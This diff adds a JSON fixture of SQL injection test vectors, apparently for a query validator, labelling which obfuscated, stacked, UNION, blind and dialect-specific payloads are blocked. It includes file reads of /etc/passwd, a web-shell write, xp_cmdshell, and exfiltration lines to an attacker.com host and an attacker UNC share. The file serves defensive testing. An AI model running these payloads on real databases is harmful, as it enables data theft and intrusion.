@@ -1,0 +1,245 @@
+{
+  "metadata": {
+    "version": "2.0",
+    "description": "Comprehensive SQL injection bypass techniques from multiple security sources",
+    "sources": [
+      "https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/",
+      "https://github.com/danielmiessler/SecLists",
+      "https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF",
+      "https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet",
+      "https://nastystereo.com/security/sqli-polyglots.html"
+    ]
+  },
+  "categories": {
+    "whitespace_alternatives": {
+      "description": "Using alternative whitespace characters to bypass filters",
+      "note": "AST parsing handles these since sqlglot normalizes whitespace",
+      "vectors": [
+        {"sql": "SELECT\t*\tFROM\tusers", "should_block": false, "reason": "Tab as whitespace"},
+        {"sql": "SELECT\n*\nFROM\nusers", "should_block": false, "reason": "Newline as whitespace"},
+        {"sql": "DROP\t\tTABLE\t\tusers", "should_block": true, "reason": "DROP with tabs"},
+        {"sql": "DROP\n\nTABLE\n\nusers", "should_block": true, "reason": "DROP with newlines"},
+        {"sql": "SELECT\r\n*\r\nFROM\r\nusers", "should_block": false, "reason": "CRLF as whitespace"},
+        {"sql": "DROP\r\nTABLE\r\nusers", "should_block": true, "reason": "DROP with CRLF"}
+      ]
+    },
+    "no_space_bypass": {
+      "description": "Techniques to bypass filters without using spaces",
+      "note": "URL encoding like + for spaces must be decoded before SQL inspection",
+      "vectors": [
+        {"sql": "SELECT(1)", "should_block": false, "reason": "Parentheses instead of space"},
+        {"sql": "SELECT/**/*/**/FROM/**/users", "should_block": false, "reason": "Comments as space replacement"},
+        {"sql": "(SELECT(1))UNION(SELECT(2))", "should_block": false, "reason": "Valid UNION with parentheses (not injection)"}
+      ]
+    },
+    "comment_obfuscation": {
+      "description": "Using SQL comments to hide/obfuscate keywords",
+      "vectors": [
+        {"sql": "SELECT/**/*/**/FROM/**/users", "should_block": false, "reason": "Comments as whitespace in SELECT"},
+        {"sql": "DROP/**/TABLE/**/users", "should_block": true, "reason": "Comments as whitespace in DROP"},
+        {"sql": "DR/**/OP TABLE users", "should_block": true, "reason": "Comment splitting keyword - should fail parse or block"},
+        {"sql": "SELECT * FROM users WHERE id=1--", "should_block": false, "reason": "Trailing comment"},
+        {"sql": "SELECT * FROM users WHERE id=1#", "should_block": false, "reason": "MySQL hash comment", "dialect": "mysql"},
+        {"sql": "SELECT * FROM users /* this is a comment */ WHERE id=1", "should_block": false, "reason": "Inline block comment"},
+        {"sql": "SELECT--\n*--\nFROM--\nusers", "should_block": false, "reason": "Line comments with newlines"}
+      ]
+    },
+    "mysql_conditional_comments": {
+      "description": "MySQL version-specific conditional comments",
+      "note": "These execute only on specific MySQL versions",
+      "vectors": [
+        {"sql": "SELECT /*!50000 1,2,*/3 FROM users", "should_block": false, "reason": "MySQL conditional - version specific SELECT"},
+        {"sql": "/*!50000 DROP TABLE users */", "should_block": true, "reason": "MySQL conditional DROP"},
+        {"sql": "/*!80027 DROP TABLE users */", "should_block": true, "reason": "MySQL 8.0.27+ conditional DROP"},
+        {"sql": "SELECT /*!32302 1/0, */ 1 FROM users", "should_block": false, "reason": "MySQL version check in SELECT"}
+      ]
+    },
+    "case_and_encoding": {
+      "description": "Case manipulation and encoding tricks",
+      "vectors": [
+        {"sql": "SeLeCt * FrOm UsErS", "should_block": false, "reason": "Mixed case SELECT"},
+        {"sql": "dRoP tAbLe UsErS", "should_block": true, "reason": "Mixed case DROP"},
+        {"sql": "SELECT CHAR(68,82,79,80)", "should_block": false, "reason": "CHAR function returns string"},
+        {"sql": "SELECT 0x44524F50", "should_block": false, "reason": "Hex literal (just data)", "dialect": "mysql"},
+        {"sql": "SELECT UNHEX('44524F50')", "should_block": false, "reason": "UNHEX returns string data"},
+        {"sql": "SELECT CHR(68)||CHR(82)||CHR(79)||CHR(80)", "should_block": false, "reason": "PostgreSQL CHR concatenation"}
+      ]
+    },
+    "keyword_doubling": {
+      "description": "Doubling keywords so removing one leaves the other functional",
+      "vectors": [
+        {"sql": "SELSELECTECT * FROM users", "should_block": true, "reason": "Doubled SELECT - parse failure"},
+        {"sql": "DRDROPOP TABLE users", "should_block": true, "reason": "Doubled DROP - parse failure"},
+        {"sql": "SELECT * FROM users UNUNIONION SELECT 1,2,3", "should_block": true, "reason": "Doubled UNION - parse failure"}
+      ]
+    },
+    "parentheses_nesting": {
+      "description": "Excessive parentheses to confuse parsers",
+      "vectors": [
+        {"sql": "SELECT (((((1)))))", "should_block": false, "reason": "Nested parentheses in SELECT"},
+        {"sql": "(((((SELECT 1)))))", "should_block": false, "reason": "Statement wrapped in parentheses"},
+        {"sql": "SELECT * FROM users WHERE id=(((((1)))))", "should_block": false, "reason": "Nested parens in WHERE"},
+        {"sql": "(((DROP))) TABLE users", "should_block": true, "reason": "DROP with parentheses - should fail or block"}
+      ]
+    },
+    "stacked_with_obfuscation": {
+      "description": "Stacked queries with various bypass techniques",
+      "vectors": [
+        {"sql": "SELECT 1;/**/DROP/**/TABLE/**/users", "should_block": true, "reason": "Stacked with comments"},
+        {"sql": "SELECT 1;\nDROP TABLE users", "should_block": true, "reason": "Stacked with newline"},
+        {"sql": "SELECT 1;\t\tDROP TABLE users", "should_block": true, "reason": "Stacked with tabs"},
+        {"sql": "SELECT 1;DROP TABLE users;SELECT 2", "should_block": true, "reason": "Multiple stacked statements"},
+        {"sql": "SELECT 1;TRUNCATE TABLE users", "should_block": true, "reason": "Stacked TRUNCATE"}
+      ]
+    },
+    "union_based_advanced": {
+      "description": "Advanced UNION-based injection patterns",
+      "vectors": [
+        {"sql": "SELECT * FROM users UNION ALL SELECT NULL,NULL,NULL", "should_block": true, "reason": "UNION ALL with NULLs"},
+        {"sql": "SELECT * FROM users UNION SELECT NULL,NULL,NULL--", "should_block": true, "reason": "UNION with trailing comment"},
+        {"sql": "SELECT * FROM users WHERE 1=0 UNION SELECT table_name,NULL,NULL FROM information_schema.tables", "should_block": false, "reason": "UNION for schema enumeration (SELECT only)"},
+        {"sql": "SELECT * FROM users UNION SELECT 1,2,3,4,5,6,7,8,9,10", "should_block": true, "reason": "UNION with many literals"},
+        {"sql": "SELECT id FROM users UNION SELECT password FROM admins", "should_block": false, "reason": "Legitimate UNION of column names"}
+      ]
+    },
+    "no_comma_bypass": {
+      "description": "Bypassing filters that block commas",
+      "vectors": [
+        {"sql": "SELECT * FROM users LIMIT 1 OFFSET 0", "should_block": false, "reason": "LIMIT OFFSET instead of LIMIT 0,1"},
+        {"sql": "SELECT SUBSTRING(name FROM 1 FOR 1) FROM users", "should_block": false, "reason": "SUBSTRING FROM FOR syntax"},
+        {"sql": "SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b", "should_block": false, "reason": "JOIN instead of comma in SELECT"}
+      ]
+    },
+    "no_equal_bypass": {
+      "description": "Bypassing filters that block equal signs",
+      "vectors": [
+        {"sql": "SELECT * FROM users WHERE id LIKE 1", "should_block": false, "reason": "LIKE instead of ="},
+        {"sql": "SELECT * FROM users WHERE id BETWEEN 1 AND 1", "should_block": false, "reason": "BETWEEN instead of ="},
+        {"sql": "SELECT * FROM users WHERE id IN (1)", "should_block": false, "reason": "IN instead of ="},
+        {"sql": "SELECT * FROM users WHERE id <> 2", "should_block": false, "reason": "Not equal operator"},
+        {"sql": "SELECT * FROM users WHERE NOT id <> 1", "should_block": false, "reason": "Double negative"}
+      ]
+    },
+    "function_synonyms": {
+      "description": "Using function synonyms to bypass keyword filters",
+      "vectors": [
+        {"sql": "SELECT MID(name,1,1) FROM users", "should_block": false, "reason": "MID instead of SUBSTRING", "dialect": "mysql"},
+        {"sql": "SELECT SUBSTR(name,1,1) FROM users", "should_block": false, "reason": "SUBSTR alias"},
+        {"sql": "SELECT HEX(name) FROM users", "should_block": false, "reason": "HEX function"},
+        {"sql": "SELECT ASCII(name) FROM users", "should_block": false, "reason": "ASCII function"},
+        {"sql": "SELECT ORD(name) FROM users", "should_block": false, "reason": "ORD instead of ASCII", "dialect": "mysql"}
+      ]
+    },
+    "boolean_blind": {
+      "description": "Boolean-based blind SQL injection patterns",
+      "vectors": [
+        {"sql": "SELECT * FROM users WHERE id=1 AND 1=1", "should_block": false, "reason": "Boolean true condition"},
+        {"sql": "SELECT * FROM users WHERE id=1 AND 1=2", "should_block": false, "reason": "Boolean false condition"},
+        {"sql": "SELECT * FROM users WHERE id=1 AND SUBSTRING(@@version,1,1)='5'", "should_block": false, "reason": "Version fingerprinting"},
+        {"sql": "SELECT * FROM users WHERE id=1 OR 1=1", "should_block": false, "reason": "OR tautology"},
+        {"sql": "SELECT * FROM users WHERE id=1 AND LENGTH(database())>0", "should_block": false, "reason": "Database name length check", "dialect": "mysql"},
+        {"sql": "SELECT * FROM users WHERE id=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0", "should_block": false, "reason": "Subquery count check"}
+      ]
+    },
+    "time_based_blind": {
+      "description": "Time-based blind injection",
+      "note": "These are technically safe SELECTs but suspicious",
+      "vectors": [
+        {"sql": "SELECT * FROM users WHERE id=1 AND SLEEP(5)", "should_block": false, "reason": "MySQL SLEEP - suspicious but SELECT"},
+        {"sql": "SELECT * FROM users WHERE id=1 AND BENCHMARK(10000000,SHA1('x'))", "should_block": false, "reason": "MySQL BENCHMARK"},
+        {"sql": "SELECT * FROM users WHERE id=1; WAITFOR DELAY '0:0:5'", "should_block": true, "reason": "SQL Server WAITFOR - stacked query"},
+        {"sql": "SELECT pg_sleep(5)", "should_block": false, "reason": "PostgreSQL sleep"},
+        {"sql": "SELECT * FROM users WHERE id=1 AND IF(1=1,SLEEP(5),0)", "should_block": false, "reason": "Conditional SLEEP"}
+      ]
+    },
+    "authentication_bypass": {
+      "description": "Authentication bypass patterns",
+      "vectors": [
+        {"sql": "SELECT * FROM users WHERE username='admin'--' AND password='x'", "should_block": false, "reason": "Comment truncates password check"},
+        {"sql": "SELECT * FROM users WHERE username='admin' OR '1'='1'", "should_block": false, "reason": "OR tautology bypass"},
+        {"sql": "SELECT * FROM users WHERE username='' OR 1=1--", "should_block": false, "reason": "Empty username with tautology"},
+        {"sql": "SELECT * FROM users WHERE username='admin'/*' AND password='*/--'", "should_block": false, "reason": "Block comment bypass"}
+      ]
+    },
+    "out_of_band": {
+      "description": "Out-of-band data exfiltration techniques",
+      "vectors": [
+        {"sql": "SELECT LOAD_FILE('/etc/passwd')", "should_block": true, "reason": "File read attempt"},
+        {"sql": "SELECT * FROM users INTO OUTFILE '/tmp/data.txt'", "should_block": true, "reason": "File write attempt"},
+        {"sql": "SELECT * FROM users INTO DUMPFILE '/tmp/data.bin'", "should_block": true, "reason": "Binary file write"},
+        {"sql": "SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a'))", "should_block": true, "reason": "DNS exfiltration via LOAD_FILE"}
+      ]
+    },
+    "second_order": {
+      "description": "Payloads designed to be stored and executed later",
+      "vectors": [
+        {"sql": "INSERT INTO logs (msg) VALUES ('admin''--')", "should_block": true, "reason": "INSERT with escape sequence", "mode": "read-only"},
+        {"sql": "SELECT * FROM users WHERE name='admin'--'", "should_block": false, "reason": "Quote in string with comment"}
+      ]
+    },
+    "polyglot": {
+      "description": "Polyglot payloads that work in multiple contexts",
+      "vectors": [
+        {"sql": "SELECT * FROM users WHERE id='1' OR '1'='1'", "should_block": false, "reason": "Classic OR bypass"},
+        {"sql": "SELECT * FROM users WHERE id=1 OR 1=1--", "should_block": false, "reason": "OR with comment"},
+        {"sql": "SELECT * FROM users WHERE id='' OR ''=''", "should_block": false, "reason": "Empty string tautology"},
+        {"sql": "SELECT * FROM users WHERE 1 AND 1=0--' AND 1=0--\" AND 1=0--", "should_block": false, "reason": "Multi-context polyglot"}
+      ]
+    },
+    "real_world_payloads": {
+      "description": "Real-world payloads from disclosed vulnerabilities",
+      "vectors": [
+        {"sql": "' OR '1'='1", "should_block": true, "reason": "Classic injection - incomplete/invalid"},
+        {"sql": "1; DROP TABLE users--", "should_block": true, "reason": "Numeric context injection"},
+        {"sql": "1 UNION SELECT username,password FROM users--", "should_block": true, "reason": "UNION injection signature"},
+        {"sql": "admin'--", "should_block": true, "reason": "Comment injection - invalid SQL"},
+        {"sql": "1' AND '1'='1", "should_block": true, "reason": "Incomplete/invalid SQL"},
+        {"sql": "' OR ''='", "should_block": false, "reason": "Quote manipulation - parses as string literal"},
+        {"sql": "1' ORDER BY 1--", "should_block": true, "reason": "ORDER BY injection probe - invalid"},
+        {"sql": "' UNION SELECT NULL--", "should_block": true, "reason": "UNION probe - invalid"}
+      ]
+    },
+    "sqlserver_specific": {
+      "description": "SQL Server specific techniques",
+      "vectors": [
+        {"sql": "EXEC xp_cmdshell 'whoami'", "should_block": true, "reason": "OS command execution"},
+        {"sql": "EXEC sp_executesql N'SELECT 1'", "should_block": true, "reason": "Dynamic SQL execution"},
+        {"sql": "SELECT * FROM users--sp_password", "should_block": false, "reason": "sp_password in comment (log bypass attempt)"},
+        {"sql": "EXEC master..xp_dirtree '\\\\attacker\\share'", "should_block": true, "reason": "UNC path for NTLM capture"}
+      ]
+    },
+    "oracle_specific": {
+      "description": "Oracle specific techniques",
+      "vectors": [
+        {"sql": "SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users", "should_block": false, "reason": "HTTP exfiltration - SELECT only"},
+        {"sql": "SELECT * FROM all_tables", "should_block": false, "reason": "Oracle metadata query"},
+        {"sql": "SELECT DBMS_PIPE.RECEIVE_MESSAGE('x',10) FROM dual", "should_block": false, "reason": "Oracle time delay"}
+      ]
+    },
+    "postgres_specific": {
+      "description": "PostgreSQL specific techniques",
+      "vectors": [
+        {"sql": "SELECT * FROM pg_tables", "should_block": false, "reason": "PostgreSQL metadata"},
+        {"sql": "SELECT pg_sleep(10)", "should_block": false, "reason": "PostgreSQL sleep"},
+        {"sql": "COPY users TO '/tmp/users.txt'", "should_block": true, "reason": "COPY TO file"},
+        {"sql": "CREATE OR REPLACE FUNCTION f() RETURNS void AS $$ BEGIN END; $$ LANGUAGE plpgsql", "should_block": true, "reason": "Function creation"}
+      ]
+    },
+    "dangerous_functions": {
+      "description": "Dangerous database functions",
+      "vectors": [
+        {"sql": "SELECT LOAD_FILE('/etc/passwd')", "should_block": true, "reason": "MySQL file read"},
+        {"sql": "SELECT * INTO OUTFILE '/var/www/shell.php'", "should_block": true, "reason": "File write via SELECT"},
+        {"sql": "SELECT pg_read_file('/etc/passwd')", "should_block": false, "reason": "PostgreSQL file read - SELECT only"},
+        {"sql": "SELECT lo_import('/etc/passwd')", "should_block": false, "reason": "PostgreSQL large object import - SELECT only"}
+      ]
+    },
+    "buffer_overflow_attempts": {
+      "description": "Attempts to crash or overflow WAF buffers",
+      "note": "These test max query length limits",
+      "vectors": [
+        {"sql": "SELECT * FROM users WHERE id=1", "should_block": false, "reason": "Normal query baseline"}
+      ]
+    }
+  }
+}
